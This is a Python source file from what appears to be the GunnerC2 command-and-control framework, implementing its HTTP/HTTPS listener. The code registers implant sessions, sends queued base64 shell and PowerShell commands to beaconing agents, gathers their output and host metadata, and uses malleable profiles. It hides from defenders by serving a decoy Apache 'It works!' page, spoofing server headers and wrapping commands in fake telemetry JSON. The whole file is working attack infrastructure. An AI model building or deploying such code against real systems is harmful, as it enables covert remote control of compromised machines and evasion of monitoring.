import ssl
import threading
import os
import sys
import json
import time
import traceback, binascii
import random
import string
import base64
import queue
import re
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn

import logging
logger = logging.getLogger(__name__)

from core.listeners.base import Listener, _reg_lock, register_listener, socket_to_listener, listeners as listener_registry
from core import utils
from core.session_handlers import session_manager
from core.session_handlers.session_manager import kill_http_session
from core.listeners.tcp import _generate_tls_context as generate_tls_context
from core.print_override import set_output_context

# Malleable profile imports
from core.malleable_c2.malleable_c2 import parse_malleable_profile
from core.malleable_c2.profile_loader import _extract_payload_from_msg

# Standard GunnerC2 Imports
from core import print_override
from core.prompt_manager import prompt_manager

# Colorama Imports
from colorama import init, Fore, Style
brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"
brightmagenta = "\001" + Style.BRIGHT + Fore.MAGENTA + "\002"
brightcyan    = "\001" + Style.BRIGHT + Fore.CYAN    + "\002"
brightwhite   = "\001" + Style.BRIGHT + Fore.WHITE   + "\002"
COLOR_RESET  = "\001\x1b[0m\002"
reset = Style.RESET_ALL

class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
	daemon_threads = True
	allow_reuse_address = True


def _serve_benign(handler):
	body = b"<html><body><h1>It works!</h1></body></html>"
	handler.send_response(200)
	handler.send_header("Date", handler.date_time_string())
	handler.send_header("Server", "Apache/2.4.41 (Ubuntu)")
	handler.send_header("Connection", "close")
	handler.send_header("Content-Type", "text/html; charset=UTF-8")
	handler.send_header("Content-Length", str(len(body)))
	handler.end_headers()
	handler.wfile.write(body)


class C2HTTPRequestHandler(BaseHTTPRequestHandler):
	# same logic you had in http_handler.C2HTTPRequestHandler.do_GET / do_POST
	# omitted here for brevity; just copy your GET/POST implementations,
	# but refer to `listener = listener_registry[lid]` etc.
	RARE_HEADERS = [
		"X-Correlation-ID",
		"X-Request-ID",
		"X-Custom-Context",
		"X-Worker-Name",
		"X-Data-Context",
		"X-Trace-ID",
	]

	def _select_profile(self, listener):
		"""
		Look for one of our RARE_HEADERS in the incoming request.
		If found and listener.profiles contains that name, parse & return
		that profile.  Otherwise return the static listener.profile.
		"""
		logger.debug(brightblue + f"Searching listener {listener} for profiles" + reset)
		profs = getattr(listener, "profiles", {}) or {}
		logger.debug(brightblue + f"Found profiles {profs}" + reset)
		for hdr in self.RARE_HEADERS:
			val = self.headers.get(hdr)
			if val and val in profs:
				logger.debug(brightblue + f"Found profile header {hdr} with value {val} in profiles {profs}" + reset)
				profile = profs[val]
				#parsed = parse_malleable_profile(path)
				if profile:
					logger.debug(brightyellow + f"Successfully grabbed profile class {profile}" + reset)
					return profile
		# fallback to whatever the listener was started with
		logger.debug(brightred + f"Returning none because no profile was found!" + reset)
		return None

	def _load_profile_block(self, name):
		"""Helper to grab the named block ('http-get' or 'http-post')"""
		lid      = socket_to_listener[self.server.socket.fileno()]
		profile  = listener_registry[lid].profile
		return profile.get_block(name) if profile else {}

	def _apply_server_headers(self, server_block):
		for hdr, val in server_block.get("headers", {}).items():
			self.send_header(hdr, val)

	def do_GET(self):
		try:
			with _reg_lock:
				lid = socket_to_listener.get(self.server.socket.fileno())
				if not lid or lid not in listener_registry:
					self.send_response(503)
					self.end_headers()
					return
				listener = listener_registry[lid]
			profile = self._select_profile(listener)
			#print(f"RAW REQUEST: {self.requestline}")

			if profile:
				http_get = profile.get_block("http-get")
				expected_uri = http_get.get("uri", "/")
				path = self.path.split("?", 1)[0]

				if path != expected_uri:
					logger.debug(brightred + f"Serving Benign page because path unexpected {path}, expected path: {expected_uri}" + reset)
					return _serve_benign(self)

				# extract our SID (same as before)…
				sid = None
				for hdr in ("X-Session-ID", "X-API-KEY", "X-Forward-Key"):
					sid = self.headers.get(hdr)
					if sid:
						break
				if not sid:
					logger.debug(brightred + f"Serving Benign page because no SID in get request" + reset)
					return _serve_benign(self)

				# handle new session / dead session exactly as you had it…
				if sid in session_manager.dead_sessions:
					self.send_response(410, "Gone")
					self.end_headers()
					return

				if sid not in session_manager.sessions:
					if getattr(self.server, "scheme", "http") == "https":
						session_manager.register_https_session(sid)
						msg = f"[+] New HTTPS agent: {sid}"
						utils.echo(msg,
							to_console=False,
							to_op=None,
							world_wide=True,
							color=brightgreen,
							_raw_printer=print_override._orig_print,
							end='\n')
					else:
						session_manager.register_http_session(sid)
						msg = f"[+] New HTTP agent: {sid}"
						utils.echo(msg,
							to_console=False,
							to_op=None,
							world_wide=True,
							color=brightgreen,
							_raw_printer=print_override._orig_print,
							end='\n')

				session = session_manager.sessions.get(sid)
				if session is None:
					# Unknown/expired SID — treat as permanently gone (quiet)
					self.send_response(410, "Gone")
					self.end_headers()
					return

				with _reg_lock:
					lid = socket_to_listener.get(self.server.socket.fileno())
					if lid:
						s = getattr(listener_registry[lid], "sessions", None)
						if s is None or not isinstance(s, (set, list)):
							listener_registry[lid].sessions = set()

						if sid not in listener_registry[lid].sessions:
							listener_registry[lid].sessions.append(sid)

				# queue up your commands exactly as before…
				try:
					cmd_b64 = session.meta_command_queue.get_nowait()
					session.last_cmd_type = "meta"
					logger.debug(brightblue + f"SET MODE TO METADATA COLLECTING METADATA FOR SID {sid}" + reset)

				except queue.Empty:
					# round-robin / first-come: only one operator’s command this beacon
					super_cmd_parts = []
					picked_op = None
					for op_id, q in list(session.merge_command_queue.items()):
						try:
							cmd_b64 = q.get_nowait()
							decoded_cmd = base64.b64decode(cmd_b64).decode("utf-8", errors="ignore")
							session_os = session.metadata.get("os", "").lower()
							if session_os == "windows":
								super_cmd_parts.append(f"""
									Write-Output "__OP__{op_id}__";
									{decoded_cmd}
									Write-Output "__ENDOP__{op_id}__";
								""")
							else:
								super_cmd_parts.append(f"""
									echo "__OP__{op_id}__";
									{decoded_cmd}
									echo "__ENDOP__{op_id}__";
								""")
							session.last_cmd_type = "cmd"
							picked_op = op_id
							#break
						except queue.Empty:
							continue

					if picked_op:
						combined = "\n".join(super_cmd_parts)
						logger.debug(f"EXECUTING COMMAND: {combined}")
						cmd_b64 = base64.b64encode(combined.encode("utf-8")).decode("utf-8")
						#del super_cmd_parts[0]
					else:
						cmd_b64 = ""

				payload = cmd_b64.encode() if cmd_b64 else b""

				server_out = http_get.get("server", {}).get("output", {})
				envelope = server_out.get("envelope")
				mapping  = server_out.get("mapping")
				if envelope and mapping:
					# recursively replace every "{{payload}}" with our base64 cmd
					def _render(obj):
						if obj == "{{payload}}":
							return cmd_b64
						if isinstance(obj, dict):
							return {k: _render(v) for k, v in obj.items()}
						return obj
					payload_dict = _render(mapping)
					payload = json.dumps(payload_dict).encode()

				self.send_response(200)

				# apply server.headers from the dynamic profile
				self._apply_server_headers(http_get.get("server", {}))

				if not any("Content-Type" in h for h in http_get.get("server", {}).get("headers", [])):
					self.send_header("Content-Type", "application/json; charset=UTF-8")

				self.send_header("Date",    self.date_time_string())
				self.send_header("Server",  "Apache/2.4.41 (Ubuntu)")
				self.send_header("Content-Length", str(len(payload)))
				self.end_headers()
				self.wfile.write(payload)
					
			else:
				headers = self.headers

				# only treat / or *.php as our C2 endpoint
				path = self.path.split('?', 1)[0].lower()
				if not (path == '/' or path.endswith('.php')):
					return _serve_benign(self)

				# pull session‐ID from any of our three headers
				sid = None
				for hdr in ("X-Session-ID", "X-API-KEY", "X-Forward-Key"):
					sid = self.headers.get(hdr)
					if sid:
						break

				if not sid:
					# no C2 header → normal browser GET
					return _serve_benign(self)

				if sid and sid in session_manager.dead_sessions:
					# 410 Gone tells the implant “never come back”
					self.send_response(410, "Gone")
					self.end_headers()
					return

				if sid not in session_manager.sessions:
					if getattr(self.server, "scheme", "http") == "https":
						session_manager.register_https_session(sid)
						msg = f"[+] New HTTPS agent: {sid}"
						utils.echo(msg,
							to_console=False,
							to_op=None,
							world_wide=True,
							color=brightgreen,
							_raw_printer=print_override._orig_print,
							end='\n')
					else:
						session_manager.register_http_session(sid)
						msg = f"[+] New HTTP agent: {sid}"
						utils.echo(msg,
							to_console=False,
							to_op=None,
							world_wide=True,
							color=brightgreen,
							_raw_printer=print_override._orig_print,
							end='\n')

				session = session_manager.sessions.get(sid)
				if session is None:
					# Unknown/expired SID — treat as permanently gone (quiet)
					self.send_response(410, "Gone")
					self.end_headers()
					return

				with _reg_lock:
					lid = socket_to_listener.get(self.server.socket.fileno())
					if lid:
						s = getattr(listener_registry[lid], "sessions", None)
						if s is None or not isinstance(s, (set, list)):
							listener_registry[lid].sessions = set()
							
						if sid not in listener_registry[lid].sessions:
							listener_registry[lid].sessions.append(sid)
			
				try:
					cmd_b64 = session.meta_command_queue.get_nowait()
					session.last_cmd_type = "meta"

				except queue.Empty:
					super_cmd_parts = []
					picked_op = None
					for op_id, q in list(session.merge_command_queue.items()):
						try:
							cmd_b64 = q.get_nowait()
							decoded_cmd = base64.b64decode(cmd_b64).decode("utf-8", errors="ignore")
							session_os = session.metadata.get("os", "").lower()
							if session_os == "windows":
								super_cmd_parts.append(f"""
									Write-Output "__OP__{op_id}__";
									{decoded_cmd}
									Write-Output "__ENDOP__{op_id}__";
								""")
							else:
								super_cmd_parts.append(f"""
									echo "__OP__{op_id}__";
									{decoded_cmd}
									echo "__ENDOP__{op_id}__";
								""")
							session.last_cmd_type = "cmd"
							picked_op = op_id
							#break
						except queue.Empty:
							continue

					if picked_op:
						combined = "\n".join(super_cmd_parts)
						logger.debug(f"EXECUTING COMMAND: {combined}")
						cmd_b64 = base64.b64encode(combined.encode("utf-8")).decode("utf-8")
						#del super_cmd_parts[0]
					else:
						cmd_b64 = ""

				payload_dict = {
					"cmd": cmd_b64,
					"DeviceTelemetry": {
						"Telemetry": cmd_b64
					}
				}

				payload = json.dumps(payload_dict).encode()
				self.send_response(200)
				# mimic a JSON-API content type
				self.send_header("Date",    self.date_time_string())
				self.send_header("Server",  "Apache/2.4.41 (Ubuntu)")
				self.send_header("Connection", "close")
				self.send_header("Content-Type",   "application/json; charset=UTF-8")
				self.send_header("Content-Length", str(len(payload)))
				self.end_headers()
				self.wfile.write(payload)

		except (ConnectionResetError, BrokenPipeError):
			print(brightred + f"[!] Connection reset during GET request")

		except Exception as e:
			print(brightred + f"[!] Exception in do_GET: {e}")

	def do_POST(self):
		try:
			with _reg_lock:
				lid      = socket_to_listener.get(self.server.socket.fileno())
				listener = listener_registry[lid]

			# dynamically pick profile per-request
			profile = self._select_profile(listener)
			logger.debug(brightyellow + f"Set profile to {profile}" + reset)

			if profile:
				logger.debug(brightblue + "Confirmed profile existence" + reset)
				http_post     = profile.get_block("http-post")
				expected_uri  = http_post.get("uri", "/")
				path          = self.path.split("?", 1)[0]
				if path != expected_uri:
					logger.debug(brightred + f"Serving Benign page because path was unknown PATH: {path}, RIGHT PATH: {expected_uri}" + reset)
					return _serve_benign(self)

				logger.debug(brightblue + "Correct Path selected" + reset)

				# pull session‐ID from any of our three headers
				sid = None
				for hdr in ("X-Session-ID", "X-API-KEY", "X-Forward-Key"):
					sid = self.headers.get(hdr)
					if sid:
						break

				if not sid:
					# no C2 header → normal browser POST
					logger.debug(brightred + f"Serving Benign page because no SID was sent" + reset)
					return _serve_benign(self)

				length = int(self.headers.get("Content-Length", 0))
				body = self.rfile.read(length)

				try:
					try:
						msg = json.loads(body)
						#print(f"[DEBUG] Parsed JSON: {msg}")
					
					except json.JSONDecodeError as e:
						#print(f"[!] JSON decode error: {e}")
						self.send_response(400)
						self.send_header("Connection", "close")
						self.send_header("Content-Length", "0")
						self.end_headers()
						return

					# pull our client-output mapping from the profile
					post_client = http_post.get("client", {}) or {}
					out_cfg     = post_client.get("output", {}) or {}
					mapping     = out_cfg.get("mapping", {})

					output_b64 = _extract_payload_from_msg(msg, mapping)

					try:
						output = base64.b64decode(output_b64).decode("utf-8", "ignore").strip()

					except (TypeError, binascii.Error) as e:
						# either raw was None or invalid base64
						output = ""

					except Exception as e:
						print("Failed to decode base64")

					if sid in session_manager.dead_sessions:
						self.send_response(410, "Gone")
						self.end_headers()
						return

					session = session_manager.sessions.get(sid)
					if session is None:
						# Unknown/expired SID — treat as permanently gone (quiet)
						self.send_response(410, "Gone")
						self.end_headers()
						return


					"""cwd = msg.get("cwd")
					user = msg.get("user")
					host = msg.get("host")

					if cwd: session.metadata["cwd"] = cwd
					if user: session.metadata["user"] = user
					if host: session.metadata["hostname"] = host"""

					# Handle OS detection first
					last_mode = session.last_cmd_type
					if last_mode == "meta":
						if session.mode == "detect_os":
							print(f"[DEBUG] HTTP agent {sid} OS check: {output}")
							session.detect_os(output)

							# Queue OS-specific metadata commands
							logger.debug(brightyellow + f"Enqueing metadata commands for {session.sid}" + reset)
							for _, cmd in session.os_metadata_commands:
								logger.debug(brightyellow + f"Enqued command {cmd} for {session.sid}" + reset)
								encoded_meta_command = base64.b64encode(cmd.encode()).decode()
								session.meta_command_queue.put(encoded_meta_command)

							logger.debug(brightyellow + f"Setting metadata stage to 0, starting collection....")
							session.mode = "metadata"
							session.metadata_stage = 0
							self.send_response(200)
							self.send_header("Content-Length", "0")
							self.end_headers()
							return

						# Handle metadata collection
						if session.metadata_stage == 2:
							session.metadata_stage += 1
							session.mode = "cmd"


						if session.metadata_stage < len(session.metadata_fields):
							field = session.metadata_fields[session.metadata_stage]
							"""_, cmd = session.os_metadata_commands[session.metadata_stage]

							cleaned = utils.normalize_output(output, cmd)
							low = cleaned.lower()
							error_markers = (
								"access is denied",
								"permission denied",
								"not recognized",
								"fullyqualifiederrorid",
								"categoryinfo",
							)

							if not cleaned.strip() or any(m in low for m in error_markers):
								value = "N/A"
							else:
								# first non-empty line after normalization
								value = next((ln.strip() for ln in cleaned.splitlines() if ln.strip()), "N/A")

							session.metadata[field] = value
							session.metadata_stage += 1"""

							lines = [
								line.strip()
								for line in output.splitlines()
								if line.strip() not in ("$", "#", ">") and line.strip() != ""
							]

							if len(lines) > 1:
								clean = lines[1] if lines else ""
								session.metadata[field] = clean
								session.metadata_stage += 1

							elif len(lines) == 1:
								clean = lines[0] if lines else ""
								session.metadata[field] = clean
								session.metadata_stage += 1

							else:
								pass
							#print(brightred + f"[!] Failed to execute metadata collecting commands!")

						else:
							logger.debug("About to set execution mode to cmd")
							session.mode = "cmd"
							last_mode = "cmd"
							session.collection = 1
							logger.debug("Set execution mode to cmd")

					elif last_mode == "cmd":
						if output_b64:
							pattern = re.compile(r"__OP__(?P<op>[^_]+)__(?P<out>.*?)__ENDOP__(?P=op)__", re.DOTALL)
							decoded = base64.b64decode(output_b64).decode("utf-8", "ignore").strip()
							for m in pattern.finditer(decoded):
								#print(f"FOUND m in PATTERN: {m}")
								op = m.group("op")
								out = m.group("out").strip()
								#print(f"FOUND OPERATOR: {op}")
								#print(f"FOUND OUTPUT: {out}")
								"""if op != "console":
									utils.echo(out,
										to_console=False,
										to_op=op,
										world_wide=False,
										color=False,
										_raw_printer=print_override._orig_print,
										end='\n')

								else:
									utils.echo(out,
									to_console=True,
									to_op=False,
									world_wide=False,
									color=False,
									_raw_printer=print_override._orig_print,
									end='\n')"""

								session.merge_response_queue.setdefault(op, queue.Queue())
								session.merge_response_queue[op].put(base64.b64encode(out.encode()).decode())


					else:
						pass

					#session.last_cmd_type = None

					self.send_response(200)
					self._apply_server_headers(http_post.get("server", {}))
					self.send_header("Content-Type", "application/json; charset=UTF-8")
					self.send_header("Content-Length", "0")
					self.send_header("Connection", "close")
					self.end_headers()

				except KeyError:
					# Race or late POST from dead/unknown SID
					self.send_response(410, "Gone")
					self.end_headers()
					return

				except Exception as e:
					logger.exception(f"ERROR in do_POST {e}")
					self.send_response(500)	
					self.end_headers()

			else:
				# only treat / or *.php as our C2 endpoint
				path = self.path.split('?', 1)[0].lower()
				if not (path == '/' or path.endswith('.php')):
					return _serve_benign(self)

				# pull session‐ID from any of our three headers
				sid = None
				for hdr in ("X-Session-ID", "X-API-KEY", "X-Forward-Key"):
					sid = self.headers.get(hdr)
					if sid:
						break

				if not sid:
					# no C2 header → normal browser POST
					return _serve_benign(self)

				length = int(self.headers.get("Content-Length", 0))
				body = self.rfile.read(length)

				try:
					try:
						msg = json.loads(body)
						#print(f"[DEBUG] Parsed JSON: {msg}")
					
					except json.JSONDecodeError as e:
						#print(f"[!] JSON decode error: {e}")
						self.send_response(400)
						self.send_header("Connection", "close")
						self.send_header("Content-Length", "0")
						self.end_headers()
						return

					output_b64 = msg.get("output", "") or ""

					try:
						output = base64.b64decode(output_b64).decode("utf-8", "ignore").strip()

					except (TypeError, binascii.Error) as e:
						# either raw was None or invalid base64
						output = ""

					except Exception as e:
						print("Failed to decode base64")

					if sid in session_manager.dead_sessions:
						self.send_response(410, "Gone")
						self.end_headers()
						return

					session = session_manager.sessions.get(sid)
					if session is None:
						# Unknown/expired SID — treat as permanently gone (quiet)
						self.send_response(410, "Gone")
						self.end_headers()
						return


					"""cwd = msg.get("cwd")
					user = msg.get("user")
					host = msg.get("host")

					if cwd: session.metadata["cwd"] = cwd
					if user: session.metadata["user"] = user
					if host: session.metadata["hostname"] = host"""

					# Handle OS detection first
					logger.debug(f"MODE {session.mode}")
					last_mode = session.last_cmd_type
					if last_mode == "meta":
						if session.mode == "detect_os":
							#print(f"[DEBUG] HTTP agent {sid} OS check: {output}")
							session.detect_os(output)

							# Queue OS-specific metadata commands
							for _, cmd in session.os_metadata_commands:
								encoded_meta_command = base64.b64encode(cmd.encode()).decode()
								session.meta_command_queue.put(encoded_meta_command)

							session.mode = "metadata"
							session.metadata_stage = 0
							self.send_response(200)
							self.send_header("Content-Length", "0")
							self.end_headers()
							return

						"""if session.metadata_stage == 3:
							session.metadata_stage += 1"""

						# Handle metadata collection
						if session.metadata_stage == 2:
							session.metadata_stage += 1
							session.mode = "cmd"

						#logger.debug(brightred + f"MODE: {session.mode}, stage: {session.metadata_stage}, field: {session.metadata_fields[session.metadata_stage]}")

						if session.metadata_stage < len(session.metadata_fields):
							logger.debug(brightred + f"METADATA STAGE IS LESS THAN FIELDS, stage: {session.metadata_stage}, field: {session.metadata_fields[session.metadata_stage]}")
							field = session.metadata_fields[session.metadata_stage]
							"""_, cmd = session.os_metadata_commands[session.metadata_stage]

							cleaned = utils.normalize_output(output, cmd)
							low = cleaned.lower()
							error_markers = (
								"access is denied",
								"permission denied",
								"not recognized",
								"fullyqualifiederrorid",
								"categoryinfo",
							)

							if not cleaned.strip() or any(m in low for m in error_markers):
								value = "N/A"
							else:
								# first non-empty line after normalization
								value = next((ln.strip() for ln in cleaned.splitlines() if ln.strip()), "N/A")

							session.metadata[field] = value
							session.metadata_stage += 1"""

							lines = [
								line.strip()
								for line in output.splitlines()
								if line.strip() not in ("$", "#", ">") and line.strip() != ""
							]

							logger.debug(brightgreen + f"Found Lines {lines} for field {field}" + reset)

							if len(lines) > 1:
								clean = lines[1] if lines else ""
								session.metadata[field] = clean
								session.metadata_stage += 1

							elif len(lines) == 1:
								clean = lines[0] if lines else ""
								session.metadata[field] = clean
								session.metadata_stage += 1

							else:
								pass

						else:
							logger.debug("About to set execution mode to cmd")
							session.mode = "cmd"
							last_mode = "cmd"
							session.collection = 1
							logger.debug("Set execution mode to cmd")

					elif last_mode == "cmd":
						if output_b64:
							pattern = re.compile(r"__OP__(?P<op>[^_]+)__(?P<out>.*?)__ENDOP__(?P=op)__", re.DOTALL)
							decoded = base64.b64decode(output_b64).decode("utf-8", "ignore").strip()
							for m in pattern.finditer(decoded):
								#print(f"FOUND m in PATTERN: {m}")
								op = m.group("op")
								out = m.group("out").strip()

								session.merge_response_queue.setdefault(op, queue.Queue())
								session.merge_response_queue[op].put(base64.b64encode(out.encode()).decode())

					else:
						pass

					#session.last_cmd_type = None

					self.send_response(200)
					self.send_header("Content-Length", "0")
					self.end_headers()

				except KeyError:
					# Race or late POST from dead/unknown SID
					self.send_response(410, "Gone")
					self.end_headers()
					return

				except Exception as e:
					logger.exception(f"ERROR in do_POST {e}")
					self.send_response(500)	
					self.end_headers()

		except (ConnectionResetError, BrokenPipeError):
			print(brightred + f"[!] Connection reset during POST request")

		except Exception as e:
			print(brightred + f"[!] Exception in do_POST: {e}")
			self.send_response(400)
			self.end_headers()

	def log_message(self, *args):
		return


def generate_http_session_id():
	parts = []
	for _ in range(3):
		parts.append(''.join(random.choices(string.ascii_lowercase + string.digits, k=5)))
	return '-'.join(parts)

@register_listener("http", "https")
class HttpListener(Listener):
	"""
	Handles both HTTP and HTTPS.  If transport=="https", we wrap the socket.
	"""
	def start(self, ip, port, profile_path=None, certfile: str = None, keyfile: str = None):
		# detect whether https
		self.is_ssl = (self.transport == "https")
		set_output_context(to_console=self.to_console, to_op=self.op_id)

		# load profile if any
		prof = None
		if profile_path:
			prof = parse_malleable_profile(profile_path)
			if not prof:
				logger.error("Failed to load profile %s", profile_path)
				return
		#self.profile = prof

		# build server
		self.server = ThreadingHTTPServer((ip, port), C2HTTPRequestHandler)
		self.server.scheme = self.transport  # so handler knows http vs https

		if self.transport == "http":
			with _reg_lock:
				utils.http_listener_sockets[f"http-{ip}:{port}"] = self.server
				socket_to_listener[ self.server.socket.fileno() ] = self.id

		else:
			with _reg_lock:
				utils.https_listener_sockets[f"https-{ip}:{port}"] = self.server
				socket_to_listener[ self.server.socket.fileno() ] = self.id

		# if HTTPS, wrap
		if self.is_ssl:
			if certfile and keyfile:
				if not (os.path.isfile(certfile) and os.path.isfile(keyfile)):
					#prompt_manager.block_next_prompt = False
					print(brightred + "\n[!] Cert or key file not found, aborting HTTPS listener.")
					return

				context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
				context.load_cert_chain(certfile=certfile, keyfile=keyfile)
				print(brightgreen + f"\n[*] Loaded certificate {certfile} and key {keyfile}")

			else:
				context = generate_tls_context(ip)
				print(brightgreen + "\n[*] Using generated self-signed certificate")

			self.server.socket = context.wrap_socket(self.server.socket, server_side=True)


		print(brightgreen + f"\n[+] {self.transport.upper()} listener started on {self.ip}:{self.port}")

		# run in background
		self._thread = threading.Thread(target=self.server.serve_forever, daemon=True)
		self._thread.start()

	def run_loop(self, stop_evt):
		# serve until stop()
		try:
			while not stop_evt.is_set():
				self.server.handle_request()
		except Exception as e:
			logger.exception("HTTP listener error: %s", e)

	def stop(self, timeout=None):
		self._stop_event.set()
		# first ask the HTTPServer to exit its serve_forever loop
		try:
			self.server.shutdown()
		except Exception:
			pass
		# then close the listening socket
		try:
			self.server.server_close()
		except Exception:
			pass
		# wait for the thread to finish
		if self._thread:
			self._thread.join(timeout)

	def is_alive(self):
		return bool(self._thread and self._thread.is_alive())

	# convenience for handlers to get the profile
	@property
	def profiles(self):
		return getattr(self, "_profiles", {})

	@profiles.setter
	def profiles(self, p):
		self._profiles = p or {}